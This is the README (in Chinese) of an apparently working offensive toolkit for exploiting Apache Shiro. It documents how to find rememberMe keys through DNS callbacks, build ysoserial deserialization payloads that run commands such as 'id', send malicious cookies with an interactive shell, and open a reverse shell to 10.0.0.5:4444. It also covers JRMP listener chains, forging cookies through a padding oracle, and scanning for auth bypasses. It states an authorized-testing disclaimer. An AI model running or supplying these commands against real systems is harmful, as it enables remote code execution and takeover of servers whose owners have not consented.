# shirokit

面向**已授权**安全评估的 Apache Shiro 攻击面工具包。

覆盖 Shiro-550（`rememberMe` 反序列化）、Shiro-721（CBC Padding Oracle）和
Spring + Shiro 权限绕过：指纹识别、密钥发现、payload 生成、Cookie 伪造、
绕过扫描，以及完整的离线自测。

[English](README.md)

## 特性

* **零第三方依赖**：纯标准库实现（AES、PKCS#7、HTTP、DNS 监听、Java 序列化写入）。
* **可离线探测**：内置 URLDNS payload 生成器，密钥发现不需要 ysoserial，也不要求目标有 JDK。
* **判定可靠**：每个 key 使用独立随机子域名，精确知道是哪个 key 解密成功；
  爆破前先验证 `deleteMe` 基线，没有基线就停止，不产生假阳性。
* **密钥库经过校验**：23 个可用密钥，历史字典会被审计，支持自定义字典。
* **真正的 Shiro-721**：校准可区分 oracle、恢复 CBC 中间值、在不知道密钥的情况下
  解密合法 Cookie、伪造任意 Cookie。
* **权限绕过扫描**：35 条 payload 按解析手法分组，与未认证基线对比；
  识别登录页与登录跳转，不会把普通 200 当成功。
* **ysoserial 集成**：自动发现 jar、解析真实 payload 列表与依赖、为 JDK 9+
  自动补 `--add-opens` / `--add-exports`，并把常见 JVM 错误翻译成排查建议。
* **可自证**：26 个测试，包括真实 JVM 反序列化内置 URLDNS payload，以及真实
  CB1 payload 在本机执行命令。

## 安装

Python 3.10+（在 3.13 上测试），无需安装任何第三方包。

```bash
# run from the repository, no install
python -m shirokit --help

# or install (adds the shirokit command)
pip install -e .
shirokit --help
```

命令执行 gadget 需要（可选）：

* JDK（`java` / `javac`）；
* `ysoserial-all.jar`，工具会自动从以下位置发现：
  `-y/--ysoserial`、`$YSOSERIAL_JAR`、`../ysoserial/*.jar`、
  `./ysoserial/*.jar`、`./ysoserial.jar` 或当前目录。

```bash
python -m shirokit payload list       # 27 payloads and dependencies
python -m shirokit selftest           # AES / URLDNS / key DB / listener / ysoserial
```

## 快速体验

```bash
python examples/demo_local.py
```

它会启动 MockShiro（真实 AES 解密、`deleteMe`、URLDNS 回调），然后依次运行
指纹识别、密钥爆破、URLDNS 利用、真实 CB1 gadget 和权限绕过扫描。
工具输出为中文，这里用英文标签示意步骤：

```text
[demo] fingerprint: OK
[demo] key brute force: OK
[demo] payload generation: OK
[demo] malicious cookie: OK
[demo] CB1 gadget: OK
[demo] bypass scan: OK
```

## 命令说明

以下示例统一使用 `python -m shirokit`；安装后可直接用 `shirokit`。

### 1. 指纹识别

```bash
python -m shirokit fp -u http://target.com
python -m shirokit fp -u https://target.com -H 'X-Forwarded-For: 127.0.0.1' \
    --proxy http://127.0.0.1:8080
```

检查是否出现 `rememberMe` Cookie、无效 Cookie 是否触发 `rememberMe=deleteMe`、
是否有 Shiro 异常栈与版本线索。

### 2. 密钥库

```bash
python -m shirokit keys                # counts
python -m shirokit keys --audit        # every entry, including invalid ones
python -m shirokit keys --export keys.txt
```

自定义字典（每行一个，`#` 后为注释）：

```bash
python -m shirokit brute -u http://target.com -d cb.example.com \
    --keys-file my_keys.txt
```

### 3. 密钥爆破

```bash
# 1) point cb.example.com (and all subdomains) at your machine
# 2) run
python -m shirokit brute -u http://target.com -d cb.example.com
```

判定方式：

1. 先发随机 Cookie，要求目标回 `rememberMe=deleteMe`，否则直接停止（避免假阳性）；
2. 为每个 key 生成 `s<8位随机>.cb.example.com` 的 URLDNS payload，加密后发送；
3. 内置 DNS 监听器收到哪个 token，就说明哪个 key 解密成功并真的触发了反序列化；
4. `--verify` 会用新 token 复测命中项。

```bash
python -m shirokit brute -u http://target.com -d cb.example.com \
    --dns-port 53 --workers 8 --callback-timeout 8 --verify --json report.json
```

> URLDNS 只做 DNS 解析，所以回调必须是**域名**（IP 字面量不会触发 DNS 查询）。
> 如果只有外部 dnslog 平台，可以手工发 payload 去平台看记录，但无法自动把
> token 映射回 key。

### 4. payload 与利用

```bash
# built-in URLDNS, no ysoserial required
python -m shirokit payload url --host abc.cb.example.com -o urldns.bin

# command execution payloads via ysoserial
python -m shirokit payload ysoserial -g CB1 -c 'id' -o cb1.bin
python -m shirokit payload list

# send a malicious cookie
python -m shirokit exploit -u http://target.com -k 'KEY' -g CB1 -c 'id'
python -m shirokit exploit -u http://target.com -k 'KEY' -p cb1.bin --check
python -m shirokit exploit -u http://target.com -k 'KEY' -g CC6 \
    -c 'id; uname -a' --shell

# reverse shell template (Linux targets; use -c for Windows)
python -m shirokit exploit -u http://target.com -k 'KEY' -g CB1 \
    --reverse 10.0.0.5 4444
```

结果会区分三种情况：回写 `deleteMe`（密钥错误、gadget 被拦或 Cookie 被截断）、
未回写 `deleteMe`（解密和反序列化大概率成功）、响应异常（需人工确认）。

### 5. Spring + Shiro 权限绕过

```bash
python -m shirokit bypass -u http://target.com -p /admin/
python -m shirokit bypass -u http://target.com -p /admin/ --technique semicolon
python -m shirokit bypass -p /admin/ --list          # payloads and techniques
```

判定基于未认证基线：

* `BYPASS`：200、不是登录页、且与基线不同；
* `MAYBE`：跳转到非登录地址；
* `AUTH`：401/403；
* `FAILED`：跳回登录页、404、与基线一致。

payload 按**技术手法**标注（`semicolon`、`encoded-dot`、`double-slash`、
`whitespace`、`trailing-slash` 等），不标注 CVE 编号。原因：Apache 的安全公告
只描述“构造的请求可能导致认证绕过”，并不提供 payload 与 CVE 的权威对应关系；
同一路径在不同 Shiro/Spring/容器版本下可能对应不同 CVE，一个 CVE 也覆盖多种变形。
因此 shirokit 不给出无法证实的 CVE 归属。

### 6. Shiro-721（Padding Oracle）

```bash
# calibrate: does the target distinguish valid from invalid padding?
python -m shirokit padding -u http://target.com --self-test

# or state the oracle explicitly
python -m shirokit padding -u http://target.com --oracle status=200 --self-test

# decrypt a valid cookie without the key
python -m shirokit padding -u http://target.com --oracle status=200 \
    --recover '<Cookie>'

# forge a valid cookie for any payload
python -m shirokit padding -u http://target.com --oracle status=200 \
    --forge cb1.bin
```

必须注意：

* 默认 Shiro 对解密失败和反序列化失败都会回 `deleteMe`，没有天然 oracle；
  只有目标异常处理或前置代理泄漏了差异（状态码、错误页、耗时）时才可利用；
* `calibrate()` 会先探测这种差异，区分不了就明确退出；
* 恢复一个 16 字节块最多需要 16 x 256 次请求，建议先用 `--recover` 和短 payload 验证。

### 7. 不出网：JRMP

```bash
# terminal 1: listener (ysoserial exploit class)
python -m shirokit jrmp --lhost 10.0.0.5 --lport 1099 -g CB1 -c 'id'

# terminal 2: JRMPClient payload
python -m shirokit payload ysoserial -g JRMPClient -c '10.0.0.5:1099' \
    -o jrmp.bin

# terminal 3: send it
python -m shirokit exploit -u http://target.com -k 'KEY' -p jrmp.bin
```

### 8. 其它

```bash
python -m shirokit serve --dns-port 53 --http-port 8000
python -m shirokit selftest
python -m shirokit fullscan -u http://target.com -d cb.example.com -c 'id'
```

## 项目结构

```text
shiro-tools/
|-- shirokit/
|   |-- __main__.py
|   |-- cli.py           # subcommands
|   |-- aes.py           # pure-Python AES/CBC/PKCS7 + Shiro cookie format
|   |-- jserial.py       # Java serialization stream writer
|   |-- gadgets.py       # built-in URLDNS + ysoserial bridge
|   |-- keys.py          # validated key database + legacy dictionary audit
|   |-- httpc.py         # dependency-free HTTP client
|   |-- detect.py        # Shiro fingerprinting
|   |-- rememberme.py    # cookie build/parse/verdict
|   |-- brute.py         # key brute force
|   |-- bypass.py        # auth-bypass payloads and scanner
|   |-- padding.py       # Shiro-721 padding oracle
|   `-- callback.py      # DNS/HTTP callback listeners
|-- examples/demo_local.py
|-- tests/               # mock Shiro/Spring targets + 26 tests
|-- pyproject.toml
|-- run_tests.py
|-- README.md
`-- README.zh-CN.md
```

## 自测

```bash
python run_tests.py -v
```

`Ran 26 tests ... OK`，覆盖：

1. AES FIPS-197 向量、`IV || CT` Cookie 格式、随机 IV 往返；
2. 密钥库审计（历史字典中的非法密钥必须被识别）；
3. 真实 JVM 反序列化内置 URLDNS payload，并通过 `InetAddressResolverProvider`
   证明 JVM 真的发起了域名解析；
4. ysoserial 集成：解析 payload 表、生成 CB1/CC6/URLDNS、本地 CB1 真实执行命令、
   真实 CB1 Cookie 打通 MockShiro、校验 `-cp ... JRMPListener` 启动命令；
5. MockShiro：指纹、爆破（只有正确密钥命中）、错误密钥 `deleteMe`、Cookie 落地；
6. MockSpring：能发现绕过且不误报，并且输出中不出现 CVE 编号；
7. Padding Oracle：恢复中间值、解密合法 Cookie、伪造 Cookie，以及可区分/不可区分
   两类目标的校准行为。

没有 JDK 时 JVM 相关测试会自动跳过；没有 ysoserial 时集成测试会自动跳过。

## 作者

M3ngde

## 授权与免责

仅用于**已获得书面授权**的渗透测试、红队演练和自有资产排查。未授权使用属于违法
行为，作者不承担任何责任。运行前请确认目标在授权范围内。
